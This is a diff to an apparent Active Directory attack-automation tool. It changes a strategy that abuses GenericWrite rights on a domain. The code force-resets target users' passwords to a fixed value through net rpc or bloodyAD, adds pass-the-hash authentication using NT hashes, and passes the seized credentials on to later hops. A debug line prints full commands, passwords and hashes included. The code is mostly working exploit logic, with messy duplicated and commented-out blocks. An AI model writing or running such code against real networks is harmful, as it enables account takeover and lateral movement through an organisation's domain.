@@ -12,6 +12,7 @@ from services.printing import print_check, print_warning, print_done
 from utils.runner import run_tool
 from utils.platform import BACKEND
 from utils.runner import run_tool, run_system_tool
+from utils.cred_store import enrich_creds
 
 @dataclass
 class GenericWriteStrategy(ExploitStrategy):
@@ -30,6 +31,8 @@ class GenericWriteStrategy(ExploitStrategy):
         return self.edge.kind in {EdgeKind.GENERIC_WRITE, EdgeKind.GENERIC_ALL}
 
     def exploit(self, creds: dict) -> ExploitResult:
+        creds = {**creds, "username": _sam(self.attacker.label)}
+        creds = enrich_creds(creds)
         if BACKEND.name == "none":
             raise HopFailedError(
                 self.edge,
@@ -46,7 +49,7 @@ class GenericWriteStrategy(ExploitStrategy):
             case NodeKind.GROUP:
                 return self._add_member(creds)
             case NodeKind.USER:
-                return self._force_change_password(creds)
+                return self._force_change_password_hash(creds)
             case NodeKind.COMPUTER:
                 return self._rbcd(creds)
             case _:
@@ -55,15 +58,16 @@ class GenericWriteStrategy(ExploitStrategy):
                     f"GenericWrite on {self.target.kind.value} — no known technique"
                 )
             
-    def _force_change_password(self, creds: dict) -> ExploitResult:
+    def _force_change_password_hash(self, creds: dict) -> ExploitResult:
         target_sam  = _sam(self.target.label)
         new_password = "AutoPwn@1337!"
 		# net rpc password "TargetUser" "newPass" -U "DOMAIN/User%Pass" -S "DC"
-        ok, output = run_system_tool([
-            "net", "rpc", "password", target_sam, new_password,
-            "-U", f"{creds['domain']}/{creds['username']}%{creds['password']}",
-			"-S", creds["dc_ip"]
-		])
+        ok, output = run_tool(_bloodyad(creds, [
+    		"set", "password", target_sam, new_password
+		]))
+        # ok, output = run_tool(_bloodyad(creds, [
+    	# 	"set", "password", target_sam, new_password
+		# ]))
         if not ok:
             raise HopFailedError(self.edge, f"Force change password failed:\n{output}")
         print_done(f"Password changed for {target_sam} → {new_password}")
@@ -74,6 +78,38 @@ class GenericWriteStrategy(ExploitStrategy):
 			# carry new creds forward so the next hop can use them
 			new_creds={**creds, "username": target_sam, "password": new_password}
 		)
+
+    def _force_change_password(self, creds: dict) -> ExploitResult:
+        target_sam  = _sam(self.target.label)
+        new_password = "AutoPwn@1337!"
+		# net rpc password "TargetUser" "newPass" -U "DOMAIN/User%Pass" -S "DC"
+        ok, output = run_system_tool([
+            "net", "rpc", "password", target_sam, new_password,
+            "-U", f"{creds['domain']}/{creds['username']}%{creds['password']}",
+			"-S", creds["dc_ip"]
+		])
+        # ok, output = run_tool(_bloodyad(creds, [
+    	# 	"set", "password", target_sam, new_password
+		# ]))
+        if not ok:
+            raise HopFailedError(self.edge, f"Force change password failed:\n{output}")
+        print_done(f"Password changed for {target_sam} → {new_password}")
+        return ExploitResult(
+            technique="ForceChangePassword",
+            edge=self.edge,
+            success=True,
+            notes=f"Administrator password reset to: {new_password}\n"
+                  f"You can now use credentials:\n"
+                  f"  Username: {target_sam}\n"
+                  f"  Password: {new_password}\n"
+                  f"  Domain: {creds['domain']}",
+            gained_access={
+                "username": target_sam,
+                "password": new_password,
+                "domain": creds.get("domain"),
+                "dc_ip": creds.get("dc_ip")
+            }
+        )
 # bloodyAD set object <target> <attribute> <value>
     # ── Techniques ────────────────────────────────────────────────────────────
 
@@ -129,13 +165,58 @@ def _sam(label: str) -> str:
 
 def _bloodyad(creds: dict, subcommand: list[str]) -> list[str]:
     cmd = [
-     #   "bloodyAD",
-        "--host", creds["dc_ip"],
+    #    "bloodyAD",
+        "-H",     creds["dc_ip"],
         "-d",     creds["domain"],
         "-u",     creds["username"],
     ]
-    if pw := creds.get("password"):
-        cmd += ["-p", pw]
-    elif nh := creds.get("hashes"):
-        cmd += ["--hashes", nh]
+    if hashes := creds.get("hashes"):
+		# hashes probably stored as ":52ff2a..." or just "52ff2a..."
+        hash_value = hashes if hashes.startswith(":") else f":{hashes}"
+        cmd += ["-p", hash_value]          # ← THIS IS THE KEY CHANGE
+        cmd += ["-f", "rc4"]               # optional but safe for NT hash
+
+    # === PASSWORD SUPPORT ===
+    elif password := creds.get("password"):
+        cmd += ["-p", password]
+        
+    full_cmd = cmd + subcommand
+    print(f"DEBUG bloodyad cmd: {full_cmd}") 
     return cmd + subcommand
+
+"""
+    def _force_change_password_hash(self, creds: dict) -> ExploitResult:
+        target_sam = _sam(self.target.label)
+        new_password = "AutoPwn@1337!"
+
+        # Extract NT hash cleanly
+        nt_hash = creds.get("hashes", "").lstrip(":").strip()
+        if not nt_hash:
+            nt_hash = "31d6cfe0d16ae931b73c59d7e0c089c0"  # empty NT fallback
+
+        ok, output = run_system_tool([
+            "net", "rpc", "password", target_sam, new_password,
+            "-U", f"{creds['domain']}/{creds['username']}%:{nt_hash}",
+            "-S", creds["dc_ip"]
+        ])
+
+        if not ok:
+            raise HopFailedError(self.edge, f"Force change password failed:\n{output}")
+
+        print_done(f"Password changed for {target_sam} → {new_password}")
+
+        return ExploitResult(
+            technique="ForceChangePassword",
+            edge=self.edge,
+            success=True,
+            notes=f"Password successfully reset using net rpc.\n"
+                  f"New credentials:\n"
+                  f"  {target_sam}@{creds['domain']} : {new_password}",
+            gained_access={
+                "username": target_sam,
+                "password": new_password,
+                "domain": creds.get("domain"),
+                "dc_ip": creds.get("dc_ip")
+            }
+        )
+"""
